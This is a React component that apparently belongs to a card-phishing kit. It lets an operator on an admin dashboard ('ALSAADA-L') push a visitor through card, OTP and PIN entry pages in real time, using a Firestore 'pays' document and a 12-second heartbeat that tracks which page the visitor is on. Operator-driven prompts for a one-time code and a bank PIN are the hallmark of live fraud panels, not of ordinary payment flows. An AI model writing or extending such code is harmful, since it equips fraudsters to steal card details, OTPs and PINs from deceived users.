import { useEffect, useRef } from "react";
import { doc, onSnapshot } from "firebase/firestore";
import { useLocation } from "wouter";
import { useFormData } from "@/context/FormContext";
import { db } from "@/lib/firebase";
import { getRouteForRemoteState, touchApplication } from "@/lib/application-sync";

const HEARTBEAT_INTERVAL_MS = 12000;

/**
 * ApplicationBridge — listens to the Firestore document for this session
 * and redirects the user based on actions from the admin dashboard (ALSAADA-L).
 *
 * Dashboard actions handled:
 *   status = "approved"  / "completed"  → /success
 *   status = "rejected"                 → /card  (re-enter card)
 *   redirectPage = "otp"                → /otp   (show OTP input)
 *   redirectPage = "pin"                → /otp   (show PIN input)
 *   redirectPage = "payment"            → /payment
 *   redirectPage = "confi"              → /success
 *   otpStatus   = "show_otp"            → /otp
 *   otpStatus   = "show_pin"            → /otp
 *   cardStatus  = "approved_with_otp"   → /otp
 *   cardStatus  = "approved_with_pin"   → /otp
 */
export default function ApplicationBridge() {
  const [pathname, setLocation] = useLocation();
  const { docId, hydrated } = useFormData();

  // Keep a stable ref to the current pathname to avoid stale closures inside
  // the snapshot listener without triggering re-subscription.
  const pathnameRef = useRef(pathname);
  useEffect(() => { pathnameRef.current = pathname; }, [pathname]);

  // ── Heartbeat: keep lastSeen / lastActiveAt fresh ──────────────────────────
  useEffect(() => {
    if (!hydrated || !docId) return;

    const beat = () => {
      void touchApplication(docId, pathnameRef.current).catch(() => {
        // Non-fatal — silence heartbeat errors to avoid console noise.
      });
    };

    beat();
    const interval = window.setInterval(beat, HEARTBEAT_INTERVAL_MS);
    const onFocus = () => beat();
    const onVisible = () => { if (document.visibilityState === "visible") beat(); };

    window.addEventListener("focus", onFocus);
    document.addEventListener("visibilitychange", onVisible);

    return () => {
      window.clearInterval(interval);
      window.removeEventListener("focus", onFocus);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, [docId, hydrated]);

  // ── Real-time snapshot: redirect based on dashboard decisions ───────────────
  useEffect(() => {
    if (!hydrated || !docId) return;

    const unsubscribe = onSnapshot(
      doc(db, "pays", docId),
      (snapshot) => {
        const d = snapshot.data();
        if (!d) return;

        const targetRoute = getRouteForRemoteState({
          redirectPage: d.redirectPage,
          currentStep:  d.currentStep,
          currentPage:  d.currentPage,
          status:       d.status,
          otpStatus:    d.otpStatus,
          cardStatus:   d.cardStatus,
        });

        const current = pathnameRef.current;
        if (!targetRoute || targetRoute === current) return;

        // Never go back to a step that has already been completed.
        const ORDER = ["/", "/register", "/payment", "/card", "/otp", "/success"];
        const currentIdx = ORDER.indexOf(current);
        const targetIdx  = ORDER.indexOf(targetRoute);

        // Allow dashboard to push forward, or explicitly redirect backward
        // (e.g. rejected → back to /card) — so only block pure backward hops
        // that aren't status-driven (already handled in getRouteForRemoteState).
        if (
          targetRoute !== "/success" &&
          targetRoute !== "/card" &&
          targetIdx !== -1 &&
          currentIdx !== -1 &&
          targetIdx < currentIdx
        ) {
          return;
        }

        setLocation(targetRoute);
      },
      (error) => {
        console.error("ApplicationBridge snapshot error:", error);
      }
    );

    return () => unsubscribe();
  }, [docId, hydrated, setLocation]);

  return null;
}
